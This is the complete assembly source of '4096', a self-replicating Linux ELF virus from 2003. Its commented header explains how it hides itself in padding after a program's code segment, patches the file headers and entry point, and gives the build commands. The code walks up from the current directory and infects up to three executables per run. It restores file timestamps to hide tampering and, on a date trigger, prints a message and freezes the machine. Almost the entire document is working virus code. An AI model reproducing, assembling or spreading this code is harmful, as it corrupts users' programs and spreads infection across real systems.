
;
;
;	Virus name.....................4096
;	Author.........................badCRC
;	E-mail.........................thejesterdance@hotmail.com
;	Length.........................556 bytes
;	OS.............................Linux
;	Origin.........................Spain
;	Finished.......................August 2003
;
;
;
;	--�--�--�--�--�-
;	| INTRODUCTION |
;	--�--�--�--�--�-
;
;	  First of all, I have to say my english is not very  good,  so
;	I'm sorry if you don't understand all  I  write.  I'll  try  to
;	explain me in the best way I can ;)
;
;	  This is my first released virus and I want to dedicate it  to
;	a girl who is very special for me (she knows who she is  :)  On
;	the other hand, I also want to thank Wintermute for  his  virus
;	course and all the people in  the  scene  who  write  or  wrote
;	interesting things.
;
;
;	--�--�--�--�--
;	| DISCLAIMER |
;	--�--�--�--�--
;
;	  I'm not responsible for what you do with this  virus  and  if
;	you spread it, it will be your  fault  and  not  mine.  So,  be
;	careful. In any case, this virus is  less  dangerous  than  the
;	Windows OS as you'll see xD
;
;
;	--�--�--�--�
;	| FEATURES |
;	--�--�--�--�
;
;	  It's about a runtime mid-file virus that  infects  executable
;	ELF files. Every time it is executed, it will try to  infect  3
;	files and then, it will return control to host. These files can
;	be in any directory that belong to the virus path. For example,
;	if the the virus resides  in  /tools/bin/,  it  will  look  for
;	files in bin, tools and /, that is, the root dir.
;
;	  I think the most interesting  thing  in  this  virus  is  the
;	infection method, so I'm going to explain it a little :)
;
;	  When the virus finds a file suitable for infection,  it  will
;	search in the PHT for the first loadable segment,  usually  the
;	text segment. Now, we have to check for free space in the  last
;	memory page that this segment occupies because we want to  copy
;	us there. How? It's easy: subtract from 1000h the  last  3  hex
;	digits in p_memsz (I assume 4 KB pages). Let's see an  example.
;	Suppose p_memsz = 12AF9h. So, how much space  is  free  in  the
;	last page? 1000h - AF9h = 507h = 1287 bytes. Why are we limited
;	in this way? Because we copy us in the first loadable  segment,
;	and if there is another one, its first page will be  next  ours
;	and we don't want to be overwritten when the program is  loaded
;	into memory.
;
;	  Next step is increase file size and copy the virus  into  the
;	file. We'll have to fix the offsets of some entries in the  PHT
;	because of we are going to copy us  where  the  first  loadable
;	segment ends, that is, p_offset + p_filesz. The file size  will
;	be increased in 1000h bytes because file offsets (p_offset) and
;	virtual addresses (p_vaddr) must be congruent modulo  the  page
;	size (1000h), that is, if you divide  p_offset  or  p_vaddr  by
;	1000h,  the  remainder   will   be   the   same.   For   better
;	understanding, imagine there is another loadable  segment  next
;	ours and we have to fix its offset. Suppose  p_offset = 2BF00h,
;	p_vaddr = 8074F00h and virus length = 100h. If we increase file
;	size in 100h bytes, we'll have to add 100h to p_offset (2C000h)
;	and then, p_offset and p_vaddr won't be congruent modulo 1000h.
;	So, the minimum value in order they  continue  being  congruent
;	is 1000h.
;
;	  I hope you have understood it. If not, take  a  look  at  the
;	code, ok? Good luck!
;
;
;	--�--�--�--
;	| PAYLOAD |
;	--�--�--�--
;
;	  Every 30 November the virus  will  print  a  message  on  the
;	screen. The way I use to compute the date is  not  precise,  so
;	the virus will activate a day before or after sometimes.
;
;
;	--�--�--�--�--�
;	| TO ASSEMBLE |
;	--�--�--�--�--�
;
;	nasm 4096.asm -o 4096.tmp -f elf
;	ld 4096.tmp -o 4096 -s
;	dwarf.exec 4096
;
;


BITS       32
SECTION   .text
GLOBAL    _start

_start:
      pushfd
      pushfd
      pushad

      call    delta

delta:
      mov     esi,esp
      lodsd
      sub     eax,delta
      xchg    eax,ebp                       ; EBP = delta offset

      sub     esp,730h


; time returns the seconds since January 1, 1970. Starting from this value,
;we have to compute the actual date

      xor     eax,eax
      mov     al,0dh                        ; sys_time
      mov     ebx,esp
      int     80h

      cdq
      mov     ecx,151bbh                    ; 86459 seconds
      div     ecx
      cdq
      mov     ecx,16dh                      ; 365 days
      div     ecx
      cmp     dx,14dh                       ; 30 Nov?
      jne     no_activarse


; PAYLOAD

      mov     al,04h                        ; sys_write
      xor     ebx,ebx
      inc     ebx
      lea     ecx,[mensaje+ebp]
      mov     dx,len
      int     80h

      jmp     $


no_activarse:
      mov     byte [numinfect+ebp],00h      ; set number of infections to 0

      mov     edx,dword [old_entry+ebp]
      mov     dword [esi+24h],edx

      mov     al,0b7h                       ; sys_getcwd
      add     ebx,334h
      mov     edx,ebx
      mov     cx,400h
      int     80h

abrir_dir:
      lea     ebx,[dot+ebp]
      xor     ecx,ecx
      mov     ax,05h                        ; sys_open
      int     80h

      xchg    eax,ebx                       ; EBX = fd
      xchg    eax,edi

      xor     eax,eax
      mov     ecx,esp
      add     ecx,22ah

leer_entrada:
      mov     al,59h                        ; old_readdir
      int     80h

      dec     eax
      jz      infect

      xor     eax,eax
      mov     al,06h                        ; sys_close
      int     80h

      xor     ecx,ecx
      mov     cl,02h
      xor     eax,eax
      mov     al,0b7h                       ; sys_getcwd
      mov     ebx,esp
      int     80h

      add     eax,22h
      jnz     salir

      mov     ebx,edi
      dec     ebx
      mov     al,0ch                        ; sys_chdir
      int     80h

      or      eax,eax
      jns     abrir_dir

salir:
      xor     eax,eax
      mov     al,0ch                        ; sys_chdir
      mov     ebx,edx
      int     80h

      mov     esp,esi
      popad
      popfd
      ret                                   ; return control to host

infect:
      pushad

      mov     al,05h                        ; sys_open
      mov     ebx,ecx
      add     ebx,0ah
      xor     ecx,ecx
      mov     cl,02h                        ; O_RDWR
      int     80h

      test    eax,eax                       ; error?
      jns     seguimos

      popad
      jmp     leer_entrada

seguimos:
      xchg    eax,ebx                       ; EBX = fd
      xchg    eax,ecx
      inc     eax                           ; EAX = 3 (sys_read)
      mov     edx,234h                      ; amount of bytes we want to
                                            ;read from the file (52 + 512)
      mov     ecx,esp
      add     ecx,20h
      mov     edi,ecx
      int     80h

      sub     dword [ecx],464c457fh         ; ELF?
      jnz     @close_file
      sub     byte [ecx+10h],02h            ; executable?
      jnz     @close_file

busca_loadable:
      add     ecx,20h                       ; next entry in the PHT
      dec     dword [ecx+14h]               ; loadable?
      jnz     busca_loadable

      mov     eax,dword [ecx+28h]           ; EAX = p_memsz
      neg     eax
      and     ah,0fh
      cmp     ax,virus_len
      jb      @close_file

      movzx   esi,ax

      sub     ecx,esp
      mov     edx,ecx

      xor     eax,eax
      mov     al,6ch                        ; sys_newfstat
      mov     ecx,edi
      int     80h

      mov     edi,dword [ecx+14h]           ; EDI = original file size

      xor     ecx,ecx
      mov     ch,10h
      add     ecx,edi                       ; ECX = new file size
      mov     al,5dh                        ; sys_ftruncate
      int     80h

      push    ebx

      push    eax                           ; beginning of the file (0)
      push    ebx                           ; fd
      xor     ebx,ebx
      inc     eax
      push    eax                           ; MAP_SHARED (1)
      mov     al,03h
      push    eax                           ; PROT_READ + PROT_WRITE (3)
      push    ecx                           ; map the whole file
      push    ebx                           ; 0
      mov     ebx,esp
      mov     al,5ah                        ; old_mmap
      int     80h

      add     esp,18h                       ; restore stack

      cmp     eax,0fffff000h                ; error?
      jbe     map_ok

      pop     ebx
      push    ebx

      mov     ecx,edi                       ; ECX = original file size
      xor     eax,eax
      mov     al,5dh                        ; sys_ftruncate
      int     80h

      jmp     restore_date

@close_file:
      jmp     close_file

map_ok:
      xchg    eax,ebx                       ; EBX = map address
      add     edx,ebx

      push    ecx                           ; stack new file size

      mov     eax,dword [edx+04h]           ; p_filesz
      push    eax
      add     eax,dword [edx-04h]           ; p_filesz + p_vaddr
      mov     ecx,dword [ebx+18h]           ; e_entry
      mov     dword [ebx+18h],eax           ; put new entry point
      mov     dword [old_entry+ebp],ecx     ; save old

      pop     eax                           ; p_filesz
      add     eax,dword [edx-08h]           ; p_filesz + p_offset
      movzx   ecx,word [ebx+2ch]            ; e_phnum

      add     dword [edx+04h],esi           ; new p_filesz
      add     dword [edx+08h],esi           ; new p_memsz
      mov     byte [edx+0ch],07h            ; PF_R + PF_W + PF_X

      mov     edx,ebx
      add     edx,38h                       ; EDX = PHT offset + 4

      mov     si,1000h

fix_PHT:
      cmp     dword [edx],eax
      jb      next_entry_PHT

      add     dword [edx],esi               ; fix this entry!

next_entry_PHT:
      add     edx,20h                       ; next entry in the PHT + 4
      loop    fix_PHT


      mov     edx,dword [ebx+20h]           ; e_shoff
      add     dword [ebx+20h],esi           ; fix e_shoff
      add     edx,ebx
      mov     cl,byte [ebx+30h]             ; e_shnum

fix_SHT:
      cmp     dword [edx+10h],eax
      jb      next_entry_SHT

      add     dword [edx+10h],esi           ; fix this entry!

next_entry_SHT:
      add     edx,28h                       ; next entry in the SHT
      loop    fix_SHT


      mov     ecx,edi
      sub     ecx,eax                       ; amount of bytes we are going
                                            ;to move
      dec     edi
      add     edi,ebx
      xadd    edi,esi

      std
      rep     movsb
      cld

      mov     cl,virus_len/4

      lea     esi,[_start+ebp]
      mov     edi,eax
      add     edi,ebx
      rep     movsd                         ; copy the virus!

      xor     eax,eax
      mov     al,5bh                        ; sys_munmap
      pop     ecx
      int     80h

      inc     byte [numinfect+ebp]

restore_date:
      mov     al,1eh                        ; sys_utime
      mov     ebx,esp
      add     ebx,258h
      mov     ecx,esp
      add     ecx,48h
      int     80h

      pop     ebx

close_file:
      xor     eax,eax
      mov     al,06h                        ; sys_close
      int     80h

      popad

      cmp     byte [numinfect+ebp],03h
      je      nos_vamos
      jmp     leer_entrada

nos_vamos:
      mov     al,06h                        ; sys_close
      int     80h
      jmp     salir


db '.'

dot             db '.',0
old_entry       dd final
numinfect       db 0
mensaje         db '[4096] virus coded by badCRC in 2003',0ah

len             equ $-mensaje


; This is only for the first generation

final:
      mov     eax,01h                       ; sys_exit
      int     80h


virus_len       equ final-_start
